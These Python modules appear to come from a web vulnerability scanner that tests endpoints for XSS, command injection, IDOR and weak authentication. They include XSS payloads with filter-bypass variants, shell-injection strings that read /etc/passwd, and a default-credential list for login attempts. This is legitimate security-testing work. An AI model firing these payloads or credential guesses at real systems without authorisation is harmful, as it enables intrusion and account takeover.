"""
scanner/xss.py
==============
Cross-Site Scripting (XSS) Scanner — detects reflected, stored, and DOM-based XSS.
"""

import asyncio
import re
import html
from typing import List
from loguru import logger
from core.models import Vulnerability, VulnType, Severity, Endpoint, HttpMethod, AttackVector
from core.config import ScanConfig
from core.session import ScanSession


class XSSScanner:
    """XSS detection using context-aware, WAF-bypassing payload mutation."""

    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        "'><img src=x onerror=alert(1)>",
        '<svg onload=alert(1)>',
        '"><svg onload=alert(1)>',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)">',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        '<ScRiPt>alert(1)</ScRiPt>',  # Case bypass
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',  # HTML entity bypass
        '%3Cscript%3Ealert(1)%3C/script%3E',  # URL encode bypass
        '<details open ontoggle=alert(1)>',
    ]

    def __init__(self, session: ScanSession, config: ScanConfig):
        self.session = session
        self.config = config

    async def scan(self, endpoints: List[Endpoint], attack_vectors: List[AttackVector]) -> List[Vulnerability]:
        vulns = []
        injectable = [e for e in endpoints if e.params or e.forms]
        logger.info(f"[XSS] Testing {len(injectable)} endpoints")

        async def test_endpoint(endpoint: Endpoint):
            all_params = dict(endpoint.params)
            for form in endpoint.forms:
                all_params.update(form.get("inputs", {}))

            for param_name in all_params:
                for payload in self.XSS_PAYLOADS[:8]:
                    try:
                        test_params = dict(endpoint.params)
                        test_params[param_name] = payload

                        if endpoint.method == HttpMethod.GET:
                            resp = await self.session.get(endpoint.url, params=test_params)
                        else:
                            resp = await self.session.post(endpoint.url, data=test_params)

                        if not resp:
                            continue

                        body = await resp.text(errors="ignore")
                        content_type = resp.headers.get("Content-Type", "")

                        # Check if payload reflected (unencoded) in HTML context
                        if "text/html" in content_type:
                            if payload in body:
                                vuln = Vulnerability(
                                    vuln_type=VulnType.XSS,
                                    severity=Severity.HIGH,
                                    title=f"Reflected XSS in parameter '{param_name}'",
                                    description=f"XSS payload reflected unencoded in HTTP response. Parameter '{param_name}' is vulnerable.",
                                    url=endpoint.url, method=endpoint.method,
                                    parameter=param_name, payload=payload,
                                    evidence=f"Payload '{payload[:50]}' reflected verbatim in response",
                                    confidence=0.90,
                                    remediation=(
                                        "1. HTML-encode all user output using context-aware encoding.\n"
                                        "2. Implement Content Security Policy (CSP).\n"
                                        "3. Use frameworks with auto-escaping templates.\n"
                                        "4. Validate and sanitize all input."
                                    ),
                                    cwe_id="CWE-79",
                                    owasp_category="A03:2021 – Injection",
                                )
                                vulns.append(vuln)
                                logger.warning(f"[XSS] HIGH Reflected XSS @ {endpoint.url} param={param_name}")
                                return

                    except Exception as e:
                        logger.debug(f"[XSS] Error: {e}")

        tasks = [test_endpoint(e) for e in injectable[:40]]
        await asyncio.gather(*tasks, return_exceptions=True)
        logger.info(f"[XSS] Found {len(vulns)} XSS vulnerabilities")
        return vulns


"""
scanner/cmdi.py
===============
Command Injection Scanner
"""

import asyncio, re, time
from typing import List
from loguru import logger
from core.models import Vulnerability, VulnType, Severity, Endpoint, HttpMethod, AttackVector
from core.config import ScanConfig
from core.session import ScanSession


class CMDiScanner:
    PAYLOADS = [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; sleep 3",
        "| sleep 3",
        "&& id",
        "|| id",
        "\n id",
    ]
    INDICATORS = ["uid=", "root:", "www-data", "daemon:", "/bin/sh", "command not found"]
    TIME_PAYLOADS = ["; sleep 3", "| sleep 3", "` sleep 3 `", "$(sleep 3)"]

    def __init__(self, session: ScanSession, config: ScanConfig):
        self.session = session
        self.config = config

    async def scan(self, endpoints: List[Endpoint], attack_vectors: List[AttackVector]) -> List[Vulnerability]:
        vulns = []
        injectable = [e for e in endpoints if e.params or e.forms]
        logger.info(f"[CMDi] Testing {len(injectable)} endpoints")

        for endpoint in injectable[:30]:
            all_params = dict(endpoint.params)
            for form in endpoint.forms:
                all_params.update(form.get("inputs", {}))

            for param in all_params:
                for payload in self.PAYLOADS[:6]:
                    try:
                        test_params = {**endpoint.params, param: payload}
                        if endpoint.method == HttpMethod.GET:
                            resp = await self.session.get(endpoint.url, params=test_params)
                        else:
                            resp = await self.session.post(endpoint.url, data=test_params)
                        if not resp:
                            continue
                        body = await resp.text(errors="ignore")
                        for indicator in self.INDICATORS:
                            if indicator in body:
                                vuln = Vulnerability(
                                    vuln_type=VulnType.CMDI, severity=Severity.CRITICAL,
                                    title=f"Command Injection in '{param}'",
                                    description=f"OS command output detected in response. Parameter '{param}' passes unsanitized input to system commands.",
                                    url=endpoint.url, method=endpoint.method,
                                    parameter=param, payload=payload,
                                    evidence=f"Found '{indicator}' in response body",
                                    confidence=0.92,
                                    remediation="Never pass user input to OS commands. Use allowlists for OS-level operations.",
                                    cwe_id="CWE-78", owasp_category="A03:2021 – Injection",
                                )
                                vulns.append(vuln)
                                logger.warning(f"[CMDi] CRITICAL @ {endpoint.url} param={param}")
                                break
                    except Exception:
                        pass

        logger.info(f"[CMDi] Found {len(vulns)} command injection vulnerabilities")
        return vulns


"""
scanner/idor.py
===============
Insecure Direct Object Reference (IDOR) Scanner
"""

import asyncio, re
from typing import List
from loguru import logger
from core.models import Vulnerability, VulnType, Severity, Endpoint, HttpMethod, AttackVector
from core.config import ScanConfig
from core.session import ScanSession


class IDORScanner:
    """Detects IDOR by enumerating numeric/UUID identifiers in parameters."""

    ID_PARAMS = {"id", "user_id", "uid", "account", "profile", "order", "invoice",
                 "doc", "file_id", "record", "item", "product_id", "customer_id"}

    def __init__(self, session: ScanSession, config: ScanConfig):
        self.session = session
        self.config = config

    async def scan(self, endpoints: List[Endpoint], attack_vectors: List[AttackVector]) -> List[Vulnerability]:
        vulns = []
        logger.info(f"[IDOR] Checking {len(endpoints)} endpoints for IDOR patterns")

        for endpoint in endpoints:
            all_params = dict(endpoint.params)
            for param_name, value in all_params.items():
                if param_name.lower() in self.ID_PARAMS or re.match(r"^\d+$", str(value)):
                    vuln = await self._test_idor(endpoint, param_name, str(value))
                    if vuln:
                        vulns.append(vuln)

        # Also check URL path segments for numeric IDs
        for endpoint in endpoints:
            path_vulns = await self._check_path_traversal(endpoint)
            vulns.extend(path_vulns)

        logger.info(f"[IDOR] Found {len(vulns)} potential IDOR vulnerabilities")
        return vulns

    async def _test_idor(self, endpoint: Endpoint, param: str, value: str) -> Vulnerability | None:
        """Test for horizontal privilege escalation by incrementing IDs."""
        try:
            # Try accessing adjacent IDs
            test_values = []
            if value.isdigit():
                num = int(value)
                test_values = [str(num - 1), str(num + 1), "1", "0", "2"]

            for test_val in test_values[:3]:
                test_params = {**endpoint.params, param: test_val}
                if endpoint.method == HttpMethod.GET:
                    resp = await self.session.get(endpoint.url, params=test_params)
                else:
                    resp = await self.session.post(endpoint.url, data=test_params)

                if resp and resp.status == 200 and test_val != value:
                    # If we get successful responses for different IDs without auth errors
                    return Vulnerability(
                        vuln_type=VulnType.IDOR, severity=Severity.HIGH,
                        title=f"Potential IDOR in parameter '{param}'",
                        description=f"Parameter '{param}' accepts different object IDs without proper authorization checks. An attacker may access other users' data.",
                        url=endpoint.url, method=endpoint.method,
                        parameter=param, payload=test_val,
                        evidence=f"HTTP 200 received for {param}={test_val} (original={value})",
                        confidence=0.65,
                        remediation="Implement object-level authorization checks. Verify that the authenticated user owns the requested resource.",
                        cwe_id="CWE-639", owasp_category="A01:2021 – Broken Access Control",
                    )
        except Exception:
            pass
        return None

    async def _check_path_traversal(self, endpoint: Endpoint) -> List[Vulnerability]:
        """Check URL path for numeric IDs that could indicate IDOR."""
        vulns = []
        path_id_pattern = re.compile(r"/(\d{1,10})(?:/|$)")
        match = path_id_pattern.search(endpoint.url)
        if match:
            original_id = match.group(1)
            for test_id in ["1", "2", str(int(original_id) + 1)]:
                if test_id == original_id:
                    continue
                test_url = endpoint.url.replace(f"/{original_id}", f"/{test_id}", 1)
                try:
                    resp = await self.session.get(test_url)
                    if resp and resp.status == 200:
                        vulns.append(Vulnerability(
                            vuln_type=VulnType.IDOR, severity=Severity.MEDIUM,
                            title=f"Path-based IDOR — numeric ID in URL",
                            description=f"URL path contains numeric ID {original_id}. Changing to {test_id} returns HTTP 200.",
                            url=endpoint.url, method=endpoint.method,
                            parameter="(URL path)", payload=test_url,
                            evidence=f"GET {test_url} returned HTTP 200",
                            confidence=0.60,
                            remediation="Use indirect references or GUIDs. Implement server-side authorization checks.",
                            cwe_id="CWE-639", owasp_category="A01:2021 – Broken Access Control",
                        ))
                        break
                except Exception:
                    pass
        return vulns


"""
scanner/auth.py
===============
Broken Authentication Scanner — tests session management, JWT flaws,
credential exposure, and authentication bypass patterns.
"""

import asyncio, re, base64, json
from typing import List
from loguru import logger
from core.models import Vulnerability, VulnType, Severity, Endpoint, HttpMethod, AttackVector
from core.config import ScanConfig
from core.session import ScanSession


class AuthScanner:
    """Tests for broken authentication and session management vulnerabilities."""

    WEAK_CREDENTIALS = [
        ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
        ("root", "root"), ("root", "toor"), ("test", "test"),
        ("user", "user"), ("guest", "guest"), ("admin", ""),
    ]

    JWT_NONE_BYPASS = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"  # {"alg":"none"}

    def __init__(self, session: ScanSession, config: ScanConfig):
        self.session = session
        self.config = config

    async def scan(self, endpoints: List[Endpoint], attack_vectors: List[AttackVector]) -> List[Vulnerability]:
        vulns = []
        logger.info(f"[AUTH] Running authentication tests")

        # Find login endpoints
        login_endpoints = [
            e for e in endpoints
            if any(kw in e.url.lower() for kw in ["login", "signin", "auth", "session"])
        ]

        for endpoint in login_endpoints[:5]:
            # Test default credentials
            for username, password in self.WEAK_CREDENTIALS[:5]:
                try:
                    resp = await self.session.post(endpoint.url, data={"username": username, "password": password})
                    if resp and resp.status in [200, 302]:
                        body = await resp.text(errors="ignore")
                        if "logout" in body.lower() or "dashboard" in body.lower() or resp.status == 302:
                            vulns.append(Vulnerability(
                                vuln_type=VulnType.AUTH, severity=Severity.CRITICAL,
                                title=f"Default/Weak Credentials Accepted",
                                description=f"Login succeeded with credentials {username}:{password}.",
                                url=endpoint.url, method=endpoint.method,
                                payload=f"{username}:{password}",
                                evidence=f"HTTP {resp.status} with session indicators in response",
                                confidence=0.95,
                                remediation="Enforce strong password policies. Disable default accounts.",
                                cwe_id="CWE-521", owasp_category="A07:2021 – Auth Failures",
                            ))
                            break
                except Exception:
                    pass

        # Check all responses for JWT tokens
        for endpoint in endpoints[:30]:
            try:
                resp = await self.session.get(endpoint.url)
                if not resp:
                    continue
                body = await resp.text(errors="ignore")
                headers_str = str(resp.headers)
                combined = body + headers_str

                # Detect JWT tokens
                jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
                if re.search(jwt_pattern, combined):
                    # Check for 'alg: none' vulnerability indicator
                    for match in re.finditer(jwt_pattern, combined):
                        token = match.group()
                        parts = token.split(".")
                        if len(parts) >= 2:
                            try:
                                header = json.loads(base64.b64decode(parts[0] + "=="))
                                if header.get("alg", "").lower() == "none":
                                    vulns.append(Vulnerability(
                                        vuln_type=VulnType.AUTH, severity=Severity.CRITICAL,
                                        title="JWT Algorithm 'none' Vulnerability",
                                        description="JWT token uses 'none' algorithm, allowing signature bypass.",
                                        url=endpoint.url, evidence=f"JWT with alg=none detected",
                                        confidence=0.98,
                                        remediation="Reject JWTs with 'none' algorithm. Enforce algorithm allowlist.",
                                        cwe_id="CWE-347",
                                    ))
                            except Exception:
                                pass

                # Check for missing security headers
                if "Set-Cookie" in str(resp.headers):
                    cookie_header = resp.headers.get("Set-Cookie", "")
                    issues = []
                    if "httponly" not in cookie_header.lower():
                        issues.append("Missing HttpOnly flag")
                    if "secure" not in cookie_header.lower():
                        issues.append("Missing Secure flag")
                    if "samesite" not in cookie_header.lower():
                        issues.append("Missing SameSite attribute")
                    if issues:
                        vulns.append(Vulnerability(
                            vuln_type=VulnType.AUTH, severity=Severity.MEDIUM,
                            title="Insecure Cookie Configuration",
                            description=f"Session cookie missing security attributes: {', '.join(issues)}",
                            url=endpoint.url, evidence=f"Set-Cookie: {cookie_header[:100]}",
                            confidence=0.90,
                            remediation="Add HttpOnly, Secure, and SameSite=Strict to all session cookies.",
                            cwe_id="CWE-614",
                        ))
                        break
            except Exception:
                pass

        logger.info(f"[AUTH] Found {len(vulns)} authentication vulnerabilities")
        return vulns
